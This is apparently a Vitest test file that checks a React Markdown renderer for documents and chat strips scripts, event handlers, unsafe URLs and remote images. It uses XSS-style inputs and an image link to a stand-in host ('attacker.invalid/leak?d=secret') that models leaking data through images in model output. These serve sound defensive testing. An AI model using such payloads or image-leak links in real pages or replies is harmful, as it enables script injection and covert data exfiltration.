import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { ChatMarkdown, DocumentMarkdown, safeDocumentUrl } from './DocumentMarkdown';

function render(content: string): string {
  return renderToStaticMarkup(createElement(DocumentMarkdown, { content }));
}

describe('safe document Markdown', () => {
  it('renders headings, lists, code, GFM tables and strikethrough', () => {
    const html = render(
      '# Heading\n\n- First\n- Second\n\n```text\nexample <code>\n```\n\n| Name | Value |\n| --- | --- |\n| Example | 42 |\n\n~~Old text~~',
    );
    expect(html).toContain('<h1>Heading</h1>');
    expect(html).toContain('<li>First</li>');
    expect(html).toContain('example &lt;code&gt;');
    expect(html).toContain('<table>');
    expect(html).toContain('<th>Name</th>');
    expect(html).toContain('<td>42</td>');
    expect(html).toContain('<del>Old text</del>');
  });

  it('ignores raw HTML and does not produce executable elements or handlers', () => {
    const html = render(
      '<script>alert(1)</script>\n\n<img src="https://example.invalid/tracker" onerror="alert(2)">',
    );
    expect(html).not.toContain('<script');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('onerror');
  });

  it('omits Markdown images so reading cannot trigger remote tracking requests', () => {
    const html = render('![Diagram](https://example.invalid/private-tracker.png)');
    expect(html).toContain('Imagen omitida: Diagram.');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('src=');
    expect(html).not.toContain('private-tracker');
  });

  it('keeps external links safe and strips executable or relative destinations', () => {
    const html = render(
      '[Website](https://example.com/help) [Unsafe](javascript:alert%281%29) [Relative](private.md)',
    );
    expect(html).toContain('href="https://example.com/help"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('href="private.md"');
    expect(html).toContain('<span>Relative</span>');
  });

  it.each(['javascript:alert(1)', 'data:text/html,unsafe', '//example.com', '/api/private'])(
    'blocks unsafe or ambiguous URL %s',
    (url) => expect(safeDocumentUrl(url)).toBe(''),
  );

  it('allows explicit HTTP, HTTPS and mail links', () => {
    expect(safeDocumentUrl('https://example.com/help')).toBe('https://example.com/help');
    expect(safeDocumentUrl('http://example.com/help')).toBe('http://example.com/help');
    expect(safeDocumentUrl('mailto:contact@example.invalid')).toBe(
      'mailto:contact@example.invalid',
    );
  });
});

describe('safe chat Markdown', () => {
  function renderChat(content: string): string {
    return renderToStaticMarkup(createElement(ChatMarkdown, { content }));
  }

  it('never loads remote images from model output, including reference-style images', () => {
    const html = renderChat(
      '![x](https://attacker.invalid/leak?d=secret)\n\n![ref][img]\n\n[img]: https://attacker.invalid/ref.png',
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('src=');
    expect(html).not.toContain('attacker.invalid');
    expect(html).toContain('Imagen omitida: x.');
  });

  it('renders GFM tables and keeps only explicit safe link destinations', () => {
    const html = renderChat(
      '| Plan | Precio |\n| --- | --- |\n| Base | 10 |\n\n[Sitio](https://example.com/help) [Mal](javascript:alert%281%29) <b onclick="x()">raw</b>',
    );
    expect(html).toContain('<table>');
    expect(html).toContain('<td>Base</td>');
    expect(html).toContain('href="https://example.com/help"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain('<svg');
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('onclick');
    expect(html).toContain('<span>Mal</span>');
  });
});
